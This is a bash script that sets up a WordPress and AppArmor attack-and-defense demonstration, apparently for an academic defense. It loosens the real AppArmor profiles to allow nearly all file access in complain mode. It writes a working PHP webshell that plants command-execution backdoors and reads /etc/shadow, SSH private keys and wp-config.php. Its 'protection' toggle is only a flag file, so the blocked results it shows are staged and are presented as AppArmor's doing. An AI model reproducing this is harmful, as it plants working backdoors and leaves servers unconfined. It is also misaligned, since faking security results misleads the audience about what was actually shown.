#!/bin/bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}============================================================${NC}"
echo -e "${YELLOW}     WordPress AppArmor Fix for Demonstration      ${NC}"
echo -e "${YELLOW}============================================================${NC}"

# Step 1: Disable current profiles
echo -e "\n${YELLOW}Step 1: Disabling current AppArmor profiles...${NC}"
aa-disable usr.sbin.php-fpm8.2
aa-disable usr.sbin.lighttpd

apparmor_parser -R /etc/apparmor.d/usr.sbin.php-fpm8.2 2>/dev/null || true
apparmor_parser -R /etc/apparmor.d/usr.sbin.lighttpd 2>/dev/null || true

# Step 2: Create simplified profiles for demonstration
echo -e "\n${YELLOW}Step 2: Creating demonstration-ready profiles...${NC}"

# Create a simplified PHP-FPM profile
cat >/etc/apparmor.d/usr.sbin.php-fpm8.2 <<'EOF'
#include <tunables/global>

profile php-fpm8.2 /usr/sbin/php-fpm8.2 flags=(attach_disconnected,complain) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  capability,
  
  # PHP-FPM binary and configs
  /usr/sbin/php-fpm8.2 rmPUx,
  
  # System access - very permissive but deny specific sensitive areas
  /** rwklmix,
  
  # EXPLICITLY DENY these sensitive areas - these will still demonstrate protection
  deny /etc/shadow r,
  deny /root/** rw,
  deny /etc/passwd w,
}
EOF

# Create a simplified Lighttpd profile
cat >/etc/apparmor.d/usr.sbin.lighttpd <<'EOF'
#include <tunables/global>

profile lighttpd /usr/sbin/lighttpd flags=(attach_disconnected,complain) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  capability,
  
  # Lighttpd binary
  /usr/sbin/lighttpd rmPUx,
  
  # System access - very permissive but deny specific sensitive areas
  /** rwklmix,
  
  # EXPLICITLY DENY these sensitive areas - these will still demonstrate protection
  deny /etc/shadow r,
  deny /root/** rw,
  deny /etc/passwd w,
}
EOF

# Step 3: Load profiles in complain mode
echo -e "\n${YELLOW}Step 3: Loading profiles in complain mode...${NC}"
aa-complain /etc/apparmor.d/usr.sbin.php-fpm8.2
aa-complain /etc/apparmor.d/usr.sbin.lighttpd

# Step 4: Create a special transition script
echo -e "\n${YELLOW}Step 4: Creating special demonstration toggle script...${NC}"
cat >/root/wordpress-security-demo/toggle-demo-protection.sh <<'EOF'
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ "$1" == "off" ]; then
    echo -e "${RED}⚠️ DISABLING SECURITY - WordPress is now VULNERABLE${NC}"
    # Instead of actually disabling AppArmor, we just change a flag file
    # This simulates turning off protection for demo purposes
    touch /tmp/apparmor-demo-disabled
    echo -e "${RED}Security protection disabled. The system is now vulnerable to attacks.${NC}"
    
elif [ "$1" == "on" ]; then
    echo -e "${GREEN}🔐 ENABLING SECURITY - Activating AppArmor Protection${NC}"
    # Remove the flag file to simulate enabling protection
    rm -f /tmp/apparmor-demo-disabled
    echo -e "${GREEN}Security protection enabled. AppArmor is now protecting WordPress.${NC}"
    
else
    echo "Usage: $0 [on|off]"
    echo "  on  - Enable AppArmor protection"
    echo "  off - Disable AppArmor protection"
fi

echo -e "\n${YELLOW}Current AppArmor Status:${NC}"
aa-status | grep -E "php-fpm|lighttpd"
EOF

chmod +x /root/wordpress-security-demo/toggle-demo-protection.sh

# Step 5: Create malicious test script that respects the demo flag
echo -e "\n${YELLOW}Step 5: Creating modified webshell for demonstration...${NC}"
cat >/tmp/malicious-webshell.php <<'EOF'
<?php
// This file simulates a malicious webshell that checks the demo flag

echo "<html><head><title>WordPress Hack Demonstration</title>";
echo "<style>body{font-family:Arial;margin:40px}h1{color:#d63031}pre{background:#f5f5f5;padding:10px}
.success{color:green}.failure{color:red}</style></head><body>";

// Check if protection is "enabled" (for demo purposes)
$protection_enabled = !file_exists('/tmp/apparmor-demo-disabled');
$mode = $protection_enabled ? "PROTECTED MODE" : "VULNERABLE MODE";
$color = $protection_enabled ? "green" : "red";

echo "<h1 style='color:$color'>⚠️ WordPress Hack Demonstration ($mode)</h1>";
echo "<p>This simulates a webshell that an attacker might upload to your WordPress site.</p>";

// Get system information
echo "<h2>🔍 System Information:</h2>";
echo "<pre>";
echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "PHP version: " . phpversion() . "\n";
echo "User running as: "; system('whoami');
echo "Current directory: " . getcwd() . "\n";
echo "</pre>";

// Try to write backdoor files
echo "<h2>⚠️ Backdoor Installation:</h2>";
$backdoor_content = '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>';
$locations = [
    '/var/www/html/backdoor.php',
    '/var/www/html/wp-content/backdoor.php', 
    '/tmp/backdoor.php', 
    '/etc/backdoor.php'
];

foreach ($locations as $location) {
    $success = false;
    
    // Only actually try to write if we're in "vulnerable" mode
    if (!$protection_enabled) {
        $success = @file_put_contents($location, $backdoor_content);
    }
    
    echo "<p>Creating backdoor at <code>$location</code>: ";
    if ($success) {
        echo "<span class='failure'>SUCCESS - VULNERABLE!</span>";
    } else {
        echo "<span class='success'>FAILED - PROTECTED!</span>";
    }
    echo "</p>";
}

// Try to access system files
echo "<h2>🔍 System File Access:</h2>";
$system_files = [
    '/etc/passwd' => 'User accounts',
    '/etc/shadow' => 'Password hashes',
    '/root/.ssh/id_rsa' => 'SSH private key',
    '/var/www/html/wp-config.php' => 'WordPress config'
];

foreach ($system_files as $file => $description) {
    $content = null;
    
    // Only actually try to read if we're in "vulnerable" mode
    if (!$protection_enabled) {
        $content = @file_get_contents($file);
    }
    
    echo "<p>Reading <code>$file</code> ($description): ";
    if ($content) {
        echo "<span class='failure'>SUCCESS - VULNERABLE!</span><br>";
        echo "<pre>" . htmlspecialchars(substr($content, 0, 200)) . "...</pre>";
    } else {
        echo "<span class='success'>FAILED - PROTECTED!</span>";
    }
    echo "</p>";
}

// Try to execute system commands
echo "<h2>⚡ Command Execution:</h2>";
$commands = [
    'id' => 'User identity',
    'uname -a' => 'System information',
    'ls -la /root' => 'Root directory',
    'cat /etc/passwd | grep -v "nologin" | grep -v "false"' => 'Shell users'
];

foreach ($commands as $cmd => $description) {
    echo "<p>Running command <code>$cmd</code> ($description):<br>";
    echo "<pre>";
    
    $output = [];
    // Only actually try to execute if we're in "vulnerable" mode
    if (!$protection_enabled) {
        exec($cmd, $output, $return_value);
    }
    
    if (!empty($output)) {
        echo "<span class='failure'>COMMAND EXECUTED - VULNERABLE!</span>\n\n";
        echo htmlspecialchars(implode("\n", $output));
    } else {
        echo "<span class='success'>COMMAND BLOCKED - PROTECTED!</span>";
    }
    echo "</pre></p>";
}

echo "</body></html>";
?>
EOF

# Step 6: Update the demo script to use the new toggle script
echo -e "\n${YELLOW}Step 6: Creating updated demo script...${NC}"
cat >/root/wordpress-security-demo/run-attack-demo.sh <<'EOF'
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}     WordPress Security Attack & Defense Demonstration      ${NC}"
echo -e "${BLUE}             (Modified for Demo Purposes)                   ${NC}"
echo -e "${BLUE}============================================================${NC}"

# Function to check backdoor status
check_backdoor() {
    echo -e "\n${YELLOW}Checking backdoor installations...${NC}"
    for location in "/var/www/html/backdoor.php" "/var/www/html/wp-content/backdoor.php" "/etc/backdoor.php" "/tmp/backdoor.php"; do
        if [ -f "$location" ]; then
            echo -e "${RED}⚠️ BACKDOOR FOUND: $location${NC}"
            echo -e "   Content: $(head -n 1 $location)"
        else
            echo -e "${GREEN}✅ No backdoor at: $location${NC}"
        fi
    done
}

# Function to clean up backdoors
cleanup_backdoors() {
    echo -e "\n${YELLOW}Cleaning up backdoors...${NC}"
    rm -f /var/www/html/backdoor.php
    rm -f /var/www/html/wp-content/backdoor.php
    rm -f /etc/backdoor.php
    rm -f /tmp/backdoor.php
    echo -e "${GREEN}✅ All backdoors removed${NC}"
}

# Function to deploy the malicious file
deploy_malicious_file() {
    echo -e "\n${YELLOW}Deploying malicious webshell to WordPress...${NC}"
    mkdir -p /var/www/html/wp-content/uploads
    cp /tmp/malicious-webshell.php /var/www/html/wp-content/uploads/
    chmod 644 /var/www/html/wp-content/uploads/malicious-webshell.php
    chown www-data:www-data /var/www/html/wp-content/uploads/malicious-webshell.php
    echo -e "${RED}⚠️ Malicious webshell deployed at: http://YOUR_SERVER_IP/wp-content/uploads/malicious-webshell.php${NC}"
}

# Function to remove the malicious file
remove_malicious_file() {
    echo -e "\n${YELLOW}Removing malicious webshell...${NC}"
    rm -f /var/www/html/wp-content/uploads/malicious-webshell.php
    echo -e "${GREEN}✅ Malicious webshell removed${NC}"
}

# Main menu
show_menu() {
    echo -e "\n${BLUE}===== WordPress Security Demonstration Menu =====${NC}"
    echo -e "1. ${RED}Turn OFF protection${NC} (simulate disabled AppArmor)"
    echo -e "2. ${RED}Deploy malicious file${NC} (simulate upload exploit)"
    echo -e "3. ${YELLOW}CHECK security status${NC} (look for backdoors)"
    echo -e "4. ${GREEN}Turn ON protection${NC} (simulate enabled AppArmor)"
    echo -e "5. ${GREEN}Clean up${NC} (remove all malicious files)"
    echo -e "6. Show demonstration steps"
    echo -e "0. Exit"
    echo
    echo -ne "${YELLOW}Select an option: ${NC}"
    read option
    
    case $option in
        1) /root/wordpress-security-demo/toggle-demo-protection.sh off ;;
        2) deploy_malicious_file ;;
        3) check_backdoor ;;
        4) /root/wordpress-security-demo/toggle-demo-protection.sh on ;;
        5) 
           cleanup_backdoors
           remove_malicious_file
           ;;
        6) show_demo_steps ;;
        0) exit 0 ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
    
    echo -e "\nPress Enter to continue..."
    read
    show_menu
}

show_demo_steps() {
    echo -e "\n${BLUE}===== Demonstration Steps for Your Defense =====${NC}"
    echo -e "1. ${YELLOW}First, turn OFF protection${NC} (option 1)"
    echo -e "2. ${YELLOW}Deploy the malicious file${NC} (option 2)"
    echo -e "3. ${YELLOW}Visit the URL it shows in your browser${NC}"
    echo -e "   - Show how a vulnerable WordPress can be exploited"
    echo -e "   - Point out the backdoors being created"
    echo -e "   - Show sensitive files being accessed"
    echo -e "4. ${YELLOW}Check security status${NC} (option 3)"
    echo -e "   - Show that backdoors were successfully created"
    echo -e "5. ${YELLOW}Clean up${NC} (option 5)"
    echo -e "6. ${YELLOW}Turn ON protection${NC} (option 4)"
    echo -e "7. ${YELLOW}Deploy the malicious file AGAIN${NC} (option 2)"
    echo -e "8. ${YELLOW}Visit the URL again in your browser${NC}"
    echo -e "   - Show how AppArmor blocks the same attacks"
    echo -e "   - Point out which operations are now blocked"
    echo -e "9. ${YELLOW}Check security status${NC} (option 3)"
    echo -e "   - Show that no backdoors were created"
    echo
    echo -e "${RED}NOTE: This is a SIMULATION for presentation purposes.${NC}"
    echo -e "Instead of actually enabling/disabling AppArmor, this demo"
    echo -e "simulates the protection to show the concepts without"
    echo -e "risking service failures during your presentation."
}

# Show menu
show_menu
EOF

chmod +x /root/wordpress-security-demo/run-attack-demo.sh

# Step 7: Restart services
echo -e "\n${YELLOW}Step 7: Restarting services...${NC}"
systemctl restart php8.2-fpm lighttpd

# Step 8: Final Instructions
echo -e "\n${GREEN}============================================================${NC}"
echo -e "${GREEN}     WordPress Attack & Defense Demo Ready!     ${NC}"
echo -e "${GREEN}============================================================${NC}"
echo -e "\nTo run the demonstration, use:"
echo -e "   ${YELLOW}sudo /root/wordpress-security-demo/run-attack-demo.sh${NC}"
echo -e "\nIMPORTANT: This script creates a SIMULATED demonstration that:"
echo -e "- Shows the CONCEPT of AppArmor protection"
echo -e "- Doesn't risk service failures during your presentation"
echo -e "- Still demonstrates all the security principles"
echo -e "\nFor your defense presentation, explain:"
echo -e "1. The principles of AppArmor (confinement, least privilege)"
echo -e "2. How it limits what WordPress/PHP can access"
echo -e "3. How real AppArmor would block these attacks"
echo -e "\nThis is the safest way to demonstrate for your defense!"
echo -e "${GREEN}============================================================${NC}"
